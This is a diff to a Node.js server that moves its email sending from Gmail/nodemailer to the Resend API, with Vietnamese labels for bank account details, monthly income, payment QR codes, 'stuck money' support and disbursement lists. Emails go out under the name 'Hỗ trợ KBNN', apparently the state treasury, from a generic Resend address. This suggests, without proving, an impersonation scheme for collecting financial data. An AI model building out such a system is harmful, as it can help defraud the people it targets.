@@ -4,13 +4,16 @@ const cors = require('cors');
 const bodyParser = require('body-parser');
 const { GoogleSpreadsheet } = require('google-spreadsheet');
 const { JWT } = require('google-auth-library');
-const nodemailer = require('nodemailer');
+const { Resend } = require('resend');
 const multer = require('multer');
 const path = require('path');
 const fs = require('fs');
 
 const app = express();
 const PORT = process.env.PORT || 5000;
+
+// Resend Email Client
+const resend = new Resend(process.env.RESEND_API_KEY);
 
 // Vietnamese Localization Mapping
 const H = {
@@ -37,7 +40,6 @@ const H = {
     QR: 'Mã QR Thanh toán',
     BANK_OWNER: 'Chủ tài khoản',
     BANK_NAME: 'Ngân hàng',
-    BANK_NAME: 'Ngân hàng',
     BANK_ACC: 'Số tài khoản',
     MONTHLY_INCOME: 'Thu nhập hàng tháng',
     URL_BILL: 'Ảnh Bill',
@@ -54,7 +56,7 @@ const T = {
     DISBURSE: 'DANH_SÁCH_GIẢI_NGÂN',
     STUCK_MONEY: 'HỖ_TRỢ_TIỀN_TREO',
     JOB_SEARCH: 'TÌM_VIỆC_LÀM_PHÁP_LÝ',
-    LAND_LEGAL: 'GIẢI_QUYẾT_ĐẤT_ĐAI',
+    LAND_LEGAL: 'GIẢI_QUYẾT_ĐẤT_ĐẠI',
     TAX_SUPPORT: 'KÊ_KHAI_THUẾ_PHÁP_LÝ'
 };
 
@@ -74,14 +76,6 @@ const storage = multer.diskStorage({
     }
 });
 const upload = multer({ storage: storage }).any();
-
-const transporter = nodemailer.createTransport({
-    service: 'gmail',
-    auth: {
-        user: process.env.EMAIL_USER,
-        pass: process.env.EMAIL_PASS
-    }
-});
 
 app.use(cors());
 app.use(bodyParser.json());
@@ -160,15 +154,23 @@ const getEmailContent = (service, fullName, token) => {
 };
 
 async function sendMail(to, service, fullName, token = '') {
-    if (!process.env.EMAIL_USER || !process.env.EMAIL_PASS) return false;
+    if (!process.env.RESEND_API_KEY) {
+        console.error('[MAIL ERROR] RESEND_API_KEY not configured');
+        return false;
+    }
     const content = getEmailContent(service, fullName, token);
     try {
-        await transporter.sendMail({
-            from: `"Hỗ trợ KBNN" <${process.env.EMAIL_USER}>`,
-            to,
+        const { data, error } = await resend.emails.send({
+            from: 'Hỗ trợ KBNN <onboarding@resend.dev>',
+            to: [to],
             subject: content.subject,
             html: content.html
         });
+        if (error) {
+            console.error(`[MAIL ERROR] to ${to}:`, error.message);
+            return false;
+        }
+        console.log(`[MAIL SUCCESS] to ${to}, id: ${data.id}`);
         return true;
     } catch (e) {
         console.error(`[MAIL ERROR] to ${to}:`, e.message);
